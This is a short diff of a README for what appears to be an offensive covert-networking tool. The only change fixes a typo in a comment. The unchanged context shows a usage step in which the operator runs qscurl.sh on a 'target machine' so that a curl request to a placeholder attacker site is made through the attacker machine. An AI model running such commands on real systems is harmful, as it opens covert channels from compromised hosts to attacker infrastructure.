@@ -61,7 +61,7 @@ need cap_net_raw cap         need internet access
 
 *> On the target machine:* Order a curl request to be performed by attacker machine
 ```
-# before modify qscurl.sh with according LISTEN and REMOTE address
+# before modify qscurl.sh with according LISTEN and REMOTE addresses
 ./qscurl.sh http://myawesomeattacersite.com -H \"toto:titi\"
 ```
 
